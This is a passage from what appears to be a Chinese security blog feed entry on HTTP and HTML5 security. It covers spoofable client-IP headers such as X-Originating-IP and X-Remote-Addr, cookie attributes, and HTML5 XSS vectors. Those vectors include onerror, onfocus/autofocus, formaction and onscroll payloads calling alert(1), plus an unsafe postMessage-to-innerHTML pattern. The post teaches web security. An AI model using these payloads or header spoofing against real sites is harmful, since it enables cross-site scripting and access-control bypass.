class="line">X-Originating-IP: 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p><code>X-Remote-Addr</code>:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Remote-Addr: 127.0.0.1</span><br></pre></td></tr></table></figure></li></ul><p>可以看到这四个请求包头都是可以伪造的，所以还是通过源IP来直接获取主机IP为好，这里给出PHP的实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span></span><br></pre></td></tr></table></figure><h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>服务器使用<code>Set-Cookie</code>设置Cookie<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; [Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly]</span><br></pre></td></tr></table></figure></p><ul><li><p><code>Expires</code>：指Cookie的过期时间</p></li><li><p><code>Domain=mozilla.org</code>：Cookie作用于<code>mozilla.org</code>及其子域名</p></li><li><p><code>Secure</code>：Cookie只能通过HTTPS发送给服务端</p></li><li><p><code>HttpOnly</code>：Cookie不能被js调用</p><p>注意Cookie的属性即是指键值对，过期时间和作用域。</p></li></ul><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>与CSP有关的header请参考<a href="http://anemone.top/HTTP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5CSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">内容安全策略CSP学习笔记</a>一文。</p><h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>与CORS有关的头部有<code>origin</code>,<code>access-control-</code>等，详细我会另开一篇文章。</p><h1 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h1><p>http协议的body部分格式主要为HTML，而新引入的HTML5中同时引入了很多安全性问题：</p><h2 id="CORS的安全性问题"><a href="#CORS的安全性问题" class="headerlink" title="CORS的安全性问题"></a>CORS的安全性问题</h2><p>详见另一篇文章</p><h2 id="新标签带来新的XSS机会"><a href="#新标签带来新的XSS机会" class="headerlink" title="新标签带来新的XSS机会"></a>新标签带来新的XSS机会</h2><ul><li><p>video</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span> <span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>类似的标签还有<code>audio</code>、<code>input</code>、<code>select</code>、<code>textarea</code>、<code>keygen</code>等。</p></li></ul><h3 id="新属性"><a href="#新属性" class="headerlink" title="新属性"></a>新属性</h3><ul><li><p>onfocus</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>formaction</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>onscroll</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onscroll</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure><p>更多可查看：<a href="http://html5sec.org/" target="_blank" rel="noopener">HTML5 标签安全</a></p></li></ul><h2 id="Web-Worker"><a href="#Web-Worker" class="headerlink" title="Web Worker"></a>Web Worker</h2><p>js的多线程支持为新的僵尸网络或挖矿脚本 提供机会：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">"worker.js"</span>);</span><br></pre></td></tr></table></figure><h3 id="PostMessage"><a href="#PostMessage" class="headerlink" title="PostMessage"></a>PostMessage</h3><p>postmessage可能会导致新的XSS攻击：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">"worker.js"</span>);</span><br><span class="line">worker.postMessage(<span class="string">"hello world"</span>);</span><br><span class="line">worker.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).innerHTML = e.data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>HTTP, <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP</a></li><li>Whitepaper: HTTP Security Headers and How They Work, <a href="https://www.netsparker.com/whitepaper-http-security-headers/#XFrameOptionsHTTPHeader" target="_blank" rel="noopener">https://www.netsparker.com/whitepaper-http-security-headers/#XFrameOptionsHTTPHeader</a></li><li>HSTS详解，<a href="https://www.jianshu.com/p/caa80c7ad45c" target="_blank" rel="noopener">https://www.jianshu.com/p/caa80c7ad45c</a></li><li>HTML5 安全问题解析, <a href="https://segmentfault.com/a/1190000003756563" target="_blank" rel="noopener">https://segmentfault.com/a/1190000003756563</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HTTP-请求&quot;&gt;&lt;a href=&quot;#HTTP-请求&quot; class=&quot;headerlink&quot; title=&quot;HTTP 请求&quot;&gt;&lt;/a&gt;HTTP 请求&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;GET 用于获取数据&lt;del&gt;，无请求body&lt;/del&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;
      
    
    </summary>
    
      <category term="Web安全-HTTP" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-HTTP/"/>
    
    
      <category term="HTTP" scheme="http://anemone.top/tags/HTTP/"/>
    
      <category term="协议安全" scheme="http://anemone.top/tags/%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
